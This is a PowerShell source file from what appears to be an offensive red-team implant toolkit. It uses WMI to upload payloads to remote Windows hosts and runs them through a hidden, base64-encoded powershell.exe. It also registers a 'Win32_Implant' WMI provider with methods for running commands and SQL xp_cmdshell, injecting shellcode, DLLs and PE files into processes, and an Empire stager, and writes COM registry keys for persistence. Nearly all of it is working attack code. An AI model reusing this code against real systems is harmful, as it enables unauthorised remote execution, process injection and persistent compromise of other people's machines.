#$pass = ConvertTo-SecureString �Password� -AsPlainText -Force
#$credential = New-Object System.Management.Automation.PSCredential (�username�, $pass)

################################################################################
# Let's get the file over there
################################################################################
Function Invoke-WMIUpload {
<#
	.SYNOPSIS
	
	.PARAMETER Target
    
    .PARAMETER Payload

    .PARAMETER ClassName
	
	.EXAMPLE
	
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
            [string]$Target = ".",
        [Parameter(Mandatory=$true, HelpMessage="File to upload.")]
            [string]$PayloadPath,
        [Parameter(Mandatory=$false, HelpMessage="Label for file in WMI.")]
            [string]$PayloadName = $PayloadPath,
        [Parameter(Mandatory=$false, HelpMessage="System to run against.")]
            [string]$ClassName = "WMIFS",
        [Parameter(Mandatory=$true, HelpMessage="Location on remote file system to place extracted file.")]
            [string]$Destination = "$env:windir\system32\wbem\",
        [Parameter(Mandatory=$false, HelpMessage="Credential object to pass.")]
            [object]$Credential
    )
    Begin {
        $null = Remove-WmiObject -Class $ClassName -Credential $Credential -ComputerName $Target -Verbose
    } Process {
        $null = New-WMIFSClass -ClassName $ClassName -Target $Target -Username $Credential.UserName -SecurePassword $Credential.Password -Verbose
        $EncodedText = ConvertTo-Base64 -FileName $PayloadPath -Verbose
        Invoke-InsertFileThreaded -Target $Target -EncodedText $EncodedText -FileName $PayloadName -ClassName $ClassName -StrLen 8000 -Verbose -Credential $Credential   
        Invoke-WMIRemoteExtract -Target $Target -PayloadName $PayloadName -ClassName $ClassName -Destination $Destination -Credential $Credential
        Install-WMIProviderInstallUtil -Target $Target -Library $Destination\$PayloadName
    } End {
    }
}

################################################################################
# Extract file remotely
################################################################################
Function Invoke-WMIRemoteExtract {
<#
	.SYNOPSIS
	
	.PARAMETER Target
    
    .PARAMETER Payload

    .PARAMETER ClassName

    .PARAMETER Destination
	
	.EXAMPLE
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false, HelpMessage="System to run against.")]
            [string]$Target = ".",
        [Parameter(Mandatory=$true, HelpMessage="Name of payload to extract.")]
            [string]$PayloadName,
        [Parameter(Mandatory=$false, HelpMessage="Class where payload is stored.")]
            [string]$ClassName = "WMIFS",
        [Parameter(Mandatory=$true, HelpMessage="Location on remote file system to place extracted file.")]
            [string]$Destination = "$env:windir\system32\wbem\",
        [Parameter(Mandatory=$false, HelpMessage="Credential object to pass.")]
            [object]$Credential
    )
    Begin {
        $InvokeRetrieveFile = "Function Invoke-RetrieveFile {" + (Get-Command Invoke-RetrieveFile).Definition + "}"
        Write-Verbose $InvokeRetrieveFile
        $ConvertFromBase64 = "Function ConvertFrom-Base64 {" + (Get-Command ConvertFrom-Base64).Definition + "}"
        $Command1 = "`$File = Invoke-RetrieveFile -FileName $PayloadName -ClassName $ClassName -Verbose"
        $Command2 = "ConvertFrom-Base64 -WriteToDisk -EncodedText `$File -FileName $Destination\$PayloadName -Verbose"
        $Base64 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("$InvokeRetrieveFile; $ConvertFromBase64; $Command1; $Command2;"))
        $RemoteCommand = "powershell.exe -NoP -NonI -Hidden -EncodedCommand $Base64"
    } Process {
        Invoke-WmiMethod -Namespace "root\cimv2" -Class Win32_Process -Name Create -ArgumentList $RemoteCommand -Credential $Credential
    } End { 
    }
}

################################################################################
# Extract file remotely
################################################################################
Function Install-WMIProviderInstallUtil {
<#
	.SYNOPSIS
	
	.PARAMETER Target
    
    .PARAMETER Payload

    .PARAMETER ClassName

    .PARAMETER Destination
	
	.EXAMPLE
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
            [string]$Target = ".",
        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
            [string]$Library = "$env:windir\system32\wbem\"
    )
    Begin {
        $RemoteCommand = "`"powershell.exe -Command `"+[System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()+`"installutil.exe /LogToConsole=false /LogFile $Library`""
        '''
        "powershell.exe -Command "+[System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()+"installutil.exe /LogToConsole=false /LogFile test.dll"
        '''
    } Process {
        Invoke-WmiMethod -Namespace "root\cimv2" -Class Win32_Process -Name Create -ArgumentList $RemoteCommand -Credential $Credential
    } End { 
        
    }
}

################################################################################
# Extract file remotely
################################################################################
Function Install-WMIProviderPowerShell {
<#
	.SYNOPSIS
	
	.PARAMETER Target
    
    .PARAMETER Payload

    .PARAMETER ClassName

    .PARAMETER Destination
	
	.EXAMPLE
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
            [string]$Target = ".",
        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
            [string]$Payload,
        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
            [string]$ClassName = "WMIFS",
        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
            [string]$Library = "$env:windir\system32\wbem\"
    )
    Begin {
        $RemoteCommand = "`"powershell.exe -Command `"+[System.Configuration.Install.ManagedInstallerClass]::InstallHelper(@('$Library'))"
        '''
        "powershell.exe -Command "+[System.Configuration.Install.ManagedInstallerClass]::InstallHelper(@(test.dll))
        '''
    } Process {
        Invoke-WmiMethod -Namespace "root\cimv2" -Class Win32_Process -Name Create -ArgumentList $RemoteCommand -Credential $Credential
    } End { 
        
    }
}

################################################################################
# Register WMI Provider Method
################################################################################
Function Install-WMIProviderFull {
<#
	.SYNOPSIS
	
	.PARAMETER Target
    
    .PARAMETER Payload

    .PARAMETER ClassName
	
	.EXAMPLE
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false, HelpMessage="System to run against.")]
            [string]$Target = ".",
        [Parameter(Mandatory=$true, HelpMessage=".")]
            [string]$ClassName,
        #[Parameter(Mandatory=$true, HelpMessage=".")]
        #    [string]$Provider,
        [Parameter(Mandatory=$false, HelpMessage=".")]
            [string]$Username,
        [Parameter(Mandatory=$false, HelpMessage=".")]
            [string]$Password,
        [Parameter(Mandatory=$false, HelpMessage=".")]
            [SecureString]$SecurePassword
    )
    Begin {
        $Class = New-WMIProviderClass -Target $Target -ClassName $ClassName -UserName $UserName -Password $Password -SecurePassword $SecurePassword

        $command = New-WMIMethodParameter -Direction "In" -Property "command" -CimType String

        $parameters = New-WMIMethodParameter -Direction "In" -Property "parameters" -CimType String
        
        $server = New-WMIMethodParameter -Direction "In" -Property "server" -CimType String
        $database = New-WMIMethodParameter -Direction "In" -Property "database" -CimType String
        $sqlusername = New-WMIMethodParameter -Direction "In" -Property "username" -CimType String
        $sqlpassword = New-WMIMethodParameter -Direction "In" -Property "password" -CimType String

        $shellcode = New-WMIMethodParameter -Direction "In" -Property "shellCodeString" -CimType String  
        
        $processId = New-WMIMethodParameter -Direction "In" -Property "processId" -CimType SInt32    

        $library = New-WMIMethodParameter -Direction "In" -Property "library" -CimType String

        $fileName = New-WMIMethodParameter -Direction "In" -Property "fileName" -CimType String
        
        $server = New-WMIMethodParameter -Direction "In" -Property "server" -CimType String
        $stagingKey = New-WMIMethodParameter -Direction "In" -Property "stagingKey" -CimType String
        $language = New-WMIMethodParameter -Direction "In" -Property "language" -CimType String 

        $output = New-WMIMethodParameter -Direction "Out" -Property "output" -CimType String
    } Process {
        Add-WMIProviderClassMethod -Class ([ref] $Class) -MethodName "RunCMD" -MethodInParameters @($command, $parameters) -MethodOutParameters @($output)
        Add-WMIProviderClassMethod -Class ([ref] $Class) -MethodName "RunPowerShell" -MethodInParameters @($command) -MethodOutParameters @($output)
        Add-WMIProviderClassMethod -Class ([ref] $Class) -MethodName "RunXPCmdShell" -MethodInParameters @($server, $database, $sqlusername, $sqlpassword, $command) -MethodOutParameters @($output)
        Add-WMIProviderClassMethod -Class ([ref] $Class) -MethodName "InjectShellCode" -MethodInParameters @($shellcode) -MethodOutParameters @($output)
        Add-WMIProviderClassMethod -Class ([ref] $Class) -MethodName "InjectShellCodeRemote" -MethodInParameters @($shellcode, $processId) -MethodOutParameters @($output)
        Add-WMIProviderClassMethod -Class ([ref] $Class) -MethodName "InjectDll" -MethodInParameters @($library) -MethodOutParameters @($output)
        Add-WMIProviderClassMethod -Class ([ref] $Class) -MethodName "InjectDllRemote" -MethodInParameters @($library, $processId) -MethodOutParameters @($output)
        Add-WMIProviderClassMethod -Class ([ref] $Class) -MethodName "InjectPeFromFileRemote" -MethodInParameters @($processId, $fileName, $parameters) -MethodOutParameters @($output)
        Add-WMIProviderClassMethod -Class ([ref] $Class) -MethodName "EmpireStager" -MethodInParameters @($server, $stagingKey, $language) -MethodOutParameters @($output)
    } End { 
        #$Class.Put()
    }
}

################################################################################
# Register WMI Provider Method
################################################################################
Function Install-WMIProviderExtention {
<#
	.SYNOPSIS
	    Installs the WMI Provider as an extention in ROOT/cimv2/WMI_extention.
        This is a considerably simpler install process.
	.PARAMETER Target
        System to to register WMI provider on
    .PARAMETER Username
        Username to authenticate to remote system. 
        Not required for pass-through authentication.
    .PARAMETER Password
        Password to authenticate to remote system. 
        Not required for pass-through authentication.
    .PARAMETER SecurePassword
        Password stored as secure string to authenticate to remote system. 
        Not required for pass-through authentication.
    .PARAMETER ClassName
        Name of WMI class to install on remote system.
    .PARAMETER CLRVersion
        CLR version of the library to be installed.
    .PARAMETER PublicKeyToken
        Public key token of the signed library.
    .PARAMETER LibraryLocation
	    Path to the library
	.EXAMPLE

#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false, HelpMessage="System to run against.")]
            [string]$ComputerName = ".",
        [Parameter(Mandatory=$false, HelpMessage=".")]
            [string]$Username,
        [Parameter(Mandatory=$false, HelpMessage=".")]
            [string]$Password,
        [Parameter(Mandatory=$false, HelpMessage=".")]
            [SecureString]$SecurePassword,
        [Parameter(Mandatory=$false, HelpMessage=".")]
            [SecureString]$Credential,
        [Parameter(Mandatory=$true, HelpMessage=".")]
            [string]$ClassName,
        [Parameter(Mandatory=$false, HelpMessage=".")]
            [ValidateSet ("2.0.50727", "3.0", "3.5", "v4.0.30319")]
            [string]$CLRVersion,
        [Parameter(Mandatory=$false, HelpMessage=".")]
            [string]$PublicKeyToken,
        [Parameter(Mandatory=$false, HelpMessage=".")]
            [string]$uri = "file:///",
        [Parameter(Mandatory=$true, HelpMessage=".")]
            [string]$LibraryLocation = "$env:windir\system32\wbem\$ClassName.dll"
    )
    Begin {
        $ConnectionOptions = New-Object System.Management.ConnectionOptions;
        if ($Username)
        {
            Write-Verbose "Authenticating as $Username"
            if ($Password)
            {
                [SecureString]$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
            } 
            $ConnectionOptions.Username = $Username
            $ConnectionOptions.SecurePassword = [SecureString]$SecurePassword
        }
        else
        {
            Write-Verbose "Authenticating as $env:USERNAME"
            $ConnectionOptions.Impersonation = [System.Management.ImpersonationLevel]::Impersonate;
        }
        ################################################################################
        $Guid = [System.Guid]::NewGuid()
        Write-Verbose "Using GUID $Guid"
        $Scope = New-Object System.Management.ManagementScope("\\$Target\root\cimv2", $ConnectionOptions);
        ################################################################################
        Write-Verbose "Creating WMI_extention"
        $__Win32Provider = New-Object System.Management.ManagementClass($Scope, "__Win32Provider", $null); 
        $WMI_extention = $__Win32Provider.Derive("WMI_extention")   
        $WMI_extention.Properties['Version'].Value = 1
        $WMI_extention.Properties['ClsId'].Value = "{" + $Guid.Guid + "}"
        $WMI_extention.Properties['HostingModel'].Value = "Decoupled:COM"
        $WMI_extention.Properties.Add("AssemblyName", [System.Management.CimType]::String, $false)
        $WMI_extention.Properties.Add("AssemblyPath", [System.Management.CimType]::String, $false)
        $WMI_extention.Properties.Add("CLRVersion", [System.Management.CimType]::String, $false)
        $null = $WMI_extention.put()
        ################################################################################
        Write-Verbose "Creating WMI_extention $ClassName Instance"
        $Provider = "$ClassName, Version=1.0.0.0, Culture=neutral, PublicKeyToken=$PublicKeyToken";
        $WMI_extention_instance = Set-WmiInstance -Class WMI_extention -Arguments @{
            AssemblyName = $Provider;
            AssemblyPath = $uri + $($LibraryLocation -replace "\\","/");
            CLRVersion   = $CLRVersion;
            CLSID        = "{" + $Guid.Guid + "}"
            HostingModel = "LocalSystemHost:CLR";
            Name         = $Provider;
        } -ComputerName $ComputerName
        ################################################################################
        Write-Verbose "Registering $ClassName as an Instance Provider"
        $__InstanceProviderRegistration = Set-WmiInstance -Class __InstanceProviderRegistration -Arguments @{
            Provider = $WMI_extention_instance;
            SupportsGet = "TRUE";
            SupportsPut = "TRUE";
            SupportsDelete = "TRUE";
            SupportsEnumeration = "TRUE";
        } -ComputerName $ComputerName 
        ################################################################################
        Write-Verbose "Registering $ClassName as a Method Provider"
        $__MethodProviderRegistration = Set-WmiInstance -Class __MethodProviderRegistration -Arguments @{
            Provider = $WMI_extention_instance;
        } -ComputerName $ComputerName 
        ################################################################################
    } Process {
        Write-Verbose "Registering Win32_Implant"
        $Class = New-Object System.Management.ManagementClass($Scope, [String]::Empty, $null)
        $Class['__class'] = "Win32_Implant"
        $Class.Qualifiers.Add("dynamic", $true, $false, $true, $false, $true)
        $Class.Qualifiers.Add("provider", $Provider, $false, $true, $false, $true)

        
        $Class = Add-WMIMethodRunCMD -Class $Class
        $Class = Add-WMIMethodRunPowerShell -Class $Class
        $Class = Add-WMIMethodRunXpCmdShell -Class $Class
        $Class = Add-WMIMethodInjectDll -Class $Class
        
        $null = $Class.put()
        Write-Verbose "Testing installation"
        Invoke-WmiMethod -Class Win32_Implant -Name RunPowerShell -ArgumentList "whoami"

        Get-CimClass Win32_Implant
        <#
        Remove-WmiObject -InputObject $WMI_extention_instance
        Remove-WmiObject -InputObject $__InstanceProviderRegistration
        Remove-WmiObject -InputObject $__MethodProviderRegistration
        Remove-WmiObject -InputObject $Class
        #>
    } End {
        $keys = @()
        Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList "2147483648", "\CLSID\{" + $Guid.Guid + "}"
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\CLSID\{" + $Guid.Guid + "}","","System.Management.Instrumentation.ManagedCommonProvider"

        Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList "2147483648", "\CLSID\{" + $Guid.Guid + "}\InprocServer32"
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\CLSID\{" + $Guid.Guid + "}","","C:\Windows\System32\mscoree.dll"
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\CLSID\{" + $Guid.Guid + "}","Assembly","System.Management.Instrumentation, Version="+$CLRVersion+", Culture=neutral, PublicKeyToken="+$PublicKeyToken
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\CLSID\{" + $Guid.Guid + "}","Class","System.Management.Instrumentation.ManagedCommonProvider"
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\CLSID\{" + $Guid.Guid + "}","RuntimeVersion",$CLRVersion
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\CLSID\{" + $Guid.Guid + "}","ThreadingModel","Both"

        Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList "2147483648", "\CLSID\{" + $Guid.Guid + "}\InprocServer32\"+$CLRVersion
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\CLSID\{" + $Guid.Guid + "}","",""
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\CLSID\{" + $Guid.Guid + "}","Assembly","System.Management.Instrumentation, Version="+$CLRVersion+", Culture=neutral, PublicKeyToken="+$PublicKeyToken
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\CLSID\{" + $Guid.Guid + "}","Class","System.Management.Instrumentation.ManagedCommonProvider"
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\CLSID\{" + $Guid.Guid + "}","RuntimeVersion",$CLRVersion


        Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList "2147483648", "\WOW6432Node\CLSID\{" + $Guid.Guid + "}"
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\WOW6432Node\CLSID\{" + $Guid.Guid + "}","","System.Management.Instrumentation.ManagedCommonProvider"

        Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList "2147483648", "\WOW6432Node\CLSID\{" + $Guid.Guid + "}\InprocServer32"
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\WOW6432Node\CLSID\{" + $Guid.Guid + "}","","C:\Windows\System32\mscoree.dll"
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\WOW6432Node\CLSID\{" + $Guid.Guid + "}","Assembly","System.Management.Instrumentation, Version="+$CLRVersion+", Culture=neutral, PublicKeyToken="+$PublicKeyToken
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\WOW6432Node\CLSID\{" + $Guid.Guid + "}","Class","System.Management.Instrumentation.ManagedCommonProvider"
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\WOW6432Node\CLSID\{" + $Guid.Guid + "}","RuntimeVersion",$CLRVersion
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\WOW6432Node\CLSID\{" + $Guid.Guid + "}","ThreadingModel","Both"

        Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList "2147483648", "\WOW6432Node\CLSID\{" + $Guid.Guid + "}\InprocServer32\"+$CLRVersion
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\WOW6432Node\CLSID\{" + $Guid.Guid + "}","",""
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\WOW6432Node\CLSID\{" + $Guid.Guid + "}","Assembly","System.Management.Instrumentation, Version="+$CLRVersion+", Culture=neutral, PublicKeyToken="+$PublicKeyToken
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\WOW6432Node\CLSID\{" + $Guid.Guid + "}","Class","System.Management.Instrumentation.ManagedCommonProvider"
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\WOW6432Node\CLSID\{" + $Guid.Guid + "}","RuntimeVersion",$CLRVersion


        Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList "2147483650", "\SOFTWARE\Classes\CLSID\{" + $Guid.Guid + "}"
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\CLSID\{" + $Guid.Guid + "}","","System.Management.Instrumentation.ManagedCommonProvider"

        Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList "2147483650", "\SOFTWARE\Classes\CLSID\{" + $Guid.Guid + "}\InprocServer32"
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\CLSID\{" + $Guid.Guid + "}","","C:\Windows\System32\mscoree.dll"
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\CLSID\{" + $Guid.Guid + "}","Assembly","System.Management.Instrumentation, Version="+$CLRVersion+", Culture=neutral, PublicKeyToken="+$PublicKeyToken
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\CLSID\{" + $Guid.Guid + "}","Class","System.Management.Instrumentation.ManagedCommonProvider"
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\CLSID\{" + $Guid.Guid + "}","RuntimeVersion",$CLRVersion
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\CLSID\{" + $Guid.Guid + "}","ThreadingModel","Both"

        Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList "2147483650", "\SOFTWARE\Classes\CLSID\{" + $Guid.Guid + "}\InprocServer32\"+$CLRVersion
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\CLSID\{" + $Guid.Guid + "}","",""
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\CLSID\{" + $Guid.Guid + "}","Assembly","System.Management.Instrumentation, Version="+$CLRVersion+", Culture=neutral, PublicKeyToken="+$PublicKeyToken
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\CLSID\{" + $Guid.Guid + "}","Class","System.Management.Instrumentation.ManagedCommonProvider"
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\CLSID\{" + $Guid.Guid + "}","RuntimeVersion",$CLRVersion


        Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList "2147483650", "\SOFTWARE\Classes\WOW6432Node\CLSID\{" + $Guid.Guid + "}"
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\WOW6432Node\CLSID\{" + $Guid.Guid + "}","","System.Management.Instrumentation.ManagedCommonProvider"

        Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList "2147483650", "\SOFTWARE\Classes\WOW6432Node\CLSID\{" + $Guid.Guid + "}\InprocServer32"
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\WOW6432Node\CLSID\{" + $Guid.Guid + "}","","C:\Windows\System32\mscoree.dll"
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\WOW6432Node\CLSID\{" + $Guid.Guid + "}","Assembly","System.Management.Instrumentation, Version="+$CLRVersion+", Culture=neutral, PublicKeyToken="+$PublicKeyToken
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\WOW6432Node\CLSID\{" + $Guid.Guid + "}","Class","System.Management.Instrumentation.ManagedCommonProvider"
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\WOW6432Node\CLSID\{" + $Guid.Guid + "}","RuntimeVersion",$CLRVersion
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\WOW6432Node\CLSID\{" + $Guid.Guid + "}","ThreadingModel","Both"

        Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList "2147483650", "\SOFTWARE\Classes\WOW6432Node\CLSID\{" + $Guid.Guid + "}\InprocServer32\"+$CLRVersion
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\WOW6432Node\CLSID\{" + $Guid.Guid + "}","",""
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\WOW6432Node\CLSID\{" + $Guid.Guid + "}","Assembly","System.Management.Instrumentation, Version="+$CLRVersion+", Culture=neutral, PublicKeyToken="+$PublicKeyToken
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\WOW6432Node\CLSID\{" + $Guid.Guid + "}","Class","System.Management.Instrumentation.ManagedCommonProvider"
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\WOW6432Node\CLSID\{" + $Guid.Guid + "}","RuntimeVersion",$CLRVersion


        Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList "2147483650", "\SOFTWARE\WOW6432Node\Classes\CLSID\{" + $Guid.Guid + "}"
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\WOW6432Node\Classes\CLSID\{" + $Guid.Guid + "}","","System.Management.Instrumentation.ManagedCommonProvider"

        Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList "2147483650", "\SOFTWARE\WOW6432Node\Classes\CLSID\{" + $Guid.Guid + "}\InprocServer32"
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\WOW6432Node\Classes\CLSID\{" + $Guid.Guid + "}","","C:\Windows\System32\mscoree.dll"
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\WOW6432Node\Classes\CLSID\{" + $Guid.Guid + "}","Assembly","System.Management.Instrumentation, Version="+$CLRVersion+", Culture=neutral, PublicKeyToken="+$PublicKeyToken
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\WOW6432Node\Classes\CLSID\{" + $Guid.Guid + "}","Class","System.Management.Instrumentation.ManagedCommonProvider"
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\WOW6432Node\Classes\CLSID\{" + $Guid.Guid + "}","RuntimeVersion",$CLRVersion
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\WOW6432Node\Classes\CLSID\{" + $Guid.Guid + "}","ThreadingModel","Both"

        Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList "2147483650", "\SOFTWARE\WOW6432Node\Classes\CLSID\{" + $Guid.Guid + "}\InprocServer32\"+$CLRVersion
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\WOW6432Node\Classes\CLSID\{" + $Guid.Guid + "}","",""
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\WOW6432Node\Classes\CLSID\{" + $Guid.Guid + "}","Assembly","System.Management.Instrumentation, Version="+$CLRVersion+", Culture=neutral, PublicKeyToken="+$PublicKeyToken
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\WOW6432Node\Classes\CLSID\{" + $Guid.Guid + "}","Class","System.Management.Instrumentation.ManagedCommonProvider"
        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\WOW6432Node\Classes\CLSID\{" + $Guid.Guid + "}","RuntimeVersion",$CLRVersion

        <# 
        Remove-WmiObject -Class "Win32_Implant"
        Remove-WmiObject -Class "WMI_extention"
        
        $implant = Get-WmiObject -Class __MethodProviderRegistration | ? provider -like "*WheresMyImplant*"
        Remove-WmiObject -InputObject $implant
        
        $implant = Get-WmiObject -Class __InstanceProviderRegistration | ? provider -like "*WheresMyImplant*"
        Remove-WmiObject -InputObject $implant
        #>
    }
}

################################################################################
################################################################################
Function Add-WMIMethodRunCMD {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, HelpMessage="Class to add method to.")] 
            [System.Management.ManagementClass]$Class
    )
    $command = New-WMIMethodParameter -Direction In -Property command -CimType String
    $parameters = New-WMIMethodParameter -Direction In -Property parameters -CimType String
    $output = New-WMIMethodParameter -Direction Out -Property output -CimType String
    return Add-WMIProviderClassMethod -Class $Class -MethodName "RunCMD" -MethodInParameters @($command, $parameters) -MethodOutParameters @($output)
}

################################################################################
################################################################################
Function Add-WMIMethodRunPowerShell {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, HelpMessage="Class to add method to.")] 
            [System.Management.ManagementClass]$Class
    )
    $command = New-WMIMethodParameter -Direction In -Property command -CimType String
    $output = New-WMIMethodParameter -Direction Out -Property output -CimType String
    return Add-WMIProviderClassMethod -Class $Class -MethodName "RunPowerShell" -MethodInParameters @($command) -MethodOutParameters @($output)
}

################################################################################
################################################################################
Function Add-WMIMethodRunXpCmdShell {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, HelpMessage="Class to add method to.")] 
            [System.Management.ManagementClass]$Class
    )
    $server = New-WMIMethodParameter -Direction In -Property server -CimType String
    $database = New-WMIMethodParameter -Direction In -Property database -CimType String
    $sqlusername = New-WMIMethodParameter -Direction In -Property username -CimType String
    $sqlpassword = New-WMIMethodParameter -Direction In -Property password -CimType String
    $command = New-WMIMethodParameter -Direction In -Property command -CimType String
    $output = New-WMIMethodParameter -Direction Out -Property output -CimType String
    return Add-WMIProviderClassMethod -Class $Class -MethodName "RunPowerShell" -MethodInParameters @($server, $database, $sqlusername, $sqlpassword, $command) -MethodOutParameters @($output)
}

################################################################################
################################################################################
Function Add-WMIMethodInjectDll {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, HelpMessage="Class to add method to.")] 
            [System.Management.ManagementClass]$Class
    )
    $dllName = New-WMIMethodParameter -Direction In -Property dllName -CimType String
    $process = New-WMIMethodParameter -Direction In -Property process -CimType String
    $output = New-WMIMethodParameter -Direction Out -Property output -CimType String
    return Add-WMIProviderClassMethod -Class $Class -MethodName "InjectDll" -MethodInParameters @($dllName, $process) -MethodOutParameters @($output)
}

################################################################################
################################################################################
Function Add-WMIMethodInjectDllRemote {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, HelpMessage="Class to add method to.")] 
            [System.Management.ManagementClass]$Class
    )
    $dllName = New-WMIMethodParameter -Direction In -Property dllName -CimType String
    $process = New-WMIMethodParameter -Direction In -Property process -CimType String
    $output = New-WMIMethodParameter -Direction Out -Property output -CimType String
    return Add-WMIProviderClassMethod -Class $Class -MethodName InjectDll -MethodInParameters @($dllName, $process) -MethodOutParameters @($output)

}

